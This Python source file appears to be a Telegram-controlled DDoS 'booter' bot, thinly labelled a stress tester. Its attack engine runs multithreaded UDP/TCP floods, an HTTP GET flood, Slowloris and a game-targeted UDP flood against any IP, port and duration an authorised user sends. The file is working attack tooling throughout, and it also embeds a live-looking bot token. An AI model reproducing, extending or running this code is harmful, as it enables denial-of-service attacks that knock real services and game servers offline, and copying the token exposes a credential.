import logging
import socket
import threading
import time
import random
import struct
import sys
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── CONFIG ───
BOT_TOKEN = "8881462630:AAEQX_BDAkR9wRehuE2fO2RoCoNUybBwVWs"
AUTHORIZED_USERS = [1987818347]
MAX_TIME = 400

# ─── ENHANCED ATTACK ENGINE ───
class AttackEngine:
    def __init__(self):
        self.active = {}
    
    def layer4_flood(self, ip, port, duration, stop):
        """Layer 4: TCP + UDP + RAW flood"""
        end = time.time() + duration
        
        # Multiple sockets for max throughput
        udp_socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(10)]
        tcp_socks = []
        
        # Pre-create TCP connections
        for _ in range(5):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((ip, port))
                tcp_socks.append(s)
            except:
                pass
        
        while time.time() < end and not stop.is_set():
            try:
                # UDP blast on multiple ports
                for sock in udp_socks:
                    for p in [port, port+1, port+2, port+5, port+10]:
                        sock.sendto(random._urandom(1400), (ip, p))
                
                # TCP - send data through established connections
                for sock in tcp_socks[:]:
                    try:
                        sock.send(random._urandom(random.randint(512, 1400)))
                    except:
                        tcp_socks.remove(sock)
            except:
                pass
        
        for sock in udp_socks + tcp_socks:
            try: sock.close()
            except: pass
    
    def layer7_http_flood(self, ip, port, duration, stop):
        """Layer 7: HTTP flood against web services"""
        end = time.time() + duration
        user_agents = [
            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
            "Dalvik/2.1.0 (Linux; U; Android 12; SM-G998B)",
            "BGMI/2.5.0 (iPhone14,3; iOS 16.0)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        ]
        
        while time.time() < end and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port or 80))
                
                req = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                ).encode()
                s.send(req)
                s.close()
            except:
                pass
    
    def slowloris_flood(self, ip, port, duration, stop):
        """Slowloris: Keep connections open"""
        end = time.time() + duration
        sockets = []
        
        # Open connections
        for _ in range(200):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, port or 80))
                s.send(b"GET / HTTP/1.1\r\n")
                sockets.append(s)
            except:
                pass
        
        # Keep them alive
        while time.time() < end and not stop.is_set():
            for s in sockets[:]:
                try:
                    s.send(b"X-a: test\r\n")
                except:
                    sockets.remove(s)
            
            # Add more
            for _ in range(10):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((ip, port or 80))
                    s.send(b"GET / HTTP/1.1\r\n")
                    sockets.append(s)
                except:
                    pass
            
            time.sleep(5)
        
        for s in sockets:
            try: s.close()
            except: pass
    
    def game_specific_flood(self, ip, port, duration, stop):
        """Game-optimized flood: UDP + TCP + custom packets"""
        end = time.time() + duration
        ports = list(range(10000, 30001))
        
        # Multiple UDP sockets
        udp_socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(20)]
        
        while time.time() < end and not stop.is_set():
            try:
                # UDP on game-specific ports
                for sock in udp_socks:
                    target_port = random.choice(ports[:500])
                    # Send game-like packets with headers
                    packet = b"GAME\x00\x01" + random._urandom(1394)
                    sock.sendto(packet, (ip, target_port))
                
                # TCP connections
                for _ in range(10):
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((ip, port))
                        s.send(random._urandom(1024))
                        s.close()
                    except:
                        pass
            except:
                pass
        
        for sock in udp_socks:
            try: sock.close()
            except: pass
    
    def start(self, ip, port, duration, method="game", threads=500):
        stop = threading.Event()
        attack_id = f"{ip}:{port}-{int(time.time())}"
        
        # Select attack method
        if method == "layer4":
            target_func = self.layer4_flood
        elif method == "http":
            target_func = self.layer7_http_flood
        elif method == "slowloris":
            target_func = self.slowloris_flood
        else:
            target_func = self.game_specific_flood
        
        # Launch threads
        for _ in range(threads):
            t = threading.Thread(target=target_func, args=(ip, port, duration, stop), daemon=True)
            t.start()
        
        self.active[attack_id] = stop
        return attack_id
    
    def stop(self, attack_id):
        if attack_id in self.active:
            self.active[attack_id].set()
            del self.active[attack_id]
            return True
        return False
    
    def stop_all(self):
        for aid in list(self.active.keys()):
            self.active[aid].set()
        self.active.clear()
        return True

engine = AttackEngine()

# ─── TELEGRAM HANDLERS ───
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ Unauthorized\nYou are not authorized to use this bot.")
        return
    
    keyboard = [
        [InlineKeyboardButton("🎮 Game Flood (Best)", callback_data="method_game")],
        [InlineKeyboardButton("🔥 Layer 4 Flood", callback_data="method_layer4")],
        [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
        [InlineKeyboardButton("🐌 Slowloris", callback_data="method_slowloris")],
        [InlineKeyboardButton("🛑 Stop All Attacks", callback_data="stop_all")],
    ]
    
    await update.message.reply_text(
        "🚀 **ADVANCED STRESS TEST BOT**\n\n"
        "Usage:\n"
        "`/attack IP PORT TIME`\n\n"
        "Example:\n"
        "`/attack 192.168.1.100 7777 120`\n\n"
        f"⏱ Max duration: {MAX_TIME}s\n"
        "🔽 Select attack method:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user.id
    if user not in AUTHORIZED_USERS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text("Usage: /attack IP PORT TIME\nExample: /attack 192.168.1.100 7777 120")
        return
    
    ip = args[0]
    port = int(args[1])
    duration = min(int(args[2]), MAX_TIME)
    method = context.user_data.get("method", "game")
    threads = context.user_data.get("threads", 500)
    
    await update.message.reply_text(
        f"⚔️ **Starting Attack**\n"
        f"Target: `{ip}:{port}`\n"
        f"Method: `{method}`\n"
        f"Duration: `{duration}s`\n"
        f"Threads: `{threads}`",
        parse_mode="Markdown"
    )
    
    attack_id = engine.start(ip, port, duration, method, threads)
    
    # Show progress
    msg = await update.message.reply_text(f"⚔️ Attack running... 0/{duration}s")
    
    for i in range(duration):
        if i % 5 == 0:
            try:
                await msg.edit_text(
                    f"⚔️ **Attacking** `{ip}:{port}`\n"
                    f"├ Method: `{method}`\n"
                    f"├ Elapsed: `{i}s / {duration}s`\n"
                    f"├ Threads: `{threads}`\n"
                    f"└ Status: 🟢 Running",
                    parse_mode="Markdown"
                )
            except:
                pass
        time.sleep(1)
    
    await msg.edit_text(
        f"✅ **Attack Complete**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: `{duration}s`\n"
        f"Method: `{method}`\n"
        f"Status: 🔴 Finished",
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    if data == "stop_all":
        engine.stop_all()
        await query.edit_message_text("🛑 All attacks stopped successfully")
    elif data.startswith("method_"):
        method = data.replace("method_", "")
        context.user_data["method"] = method
        await query.edit_message_text(
            f"✅ Method: **{method.upper()}**\n\n"
            f"Send:\n"
            f"`/attack IP PORT TIME`\n\n"
            f"Example: `/attack 192.168.1.100 7777 120`",
            parse_mode="Markdown"
        )

# ─── MAIN ───
def main():
    logging.basicConfig(level=logging.INFO)
    print("🤖 Starting bot...")
    print(f"✅ Bot token: {BOT_TOKEN[:8]}...")
    print(f"✅ Authorized users: {AUTHORIZED_USERS}")
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot is online! Send /start on Telegram")
    app.run_polling()

if __name__ == "__main__":
    main()
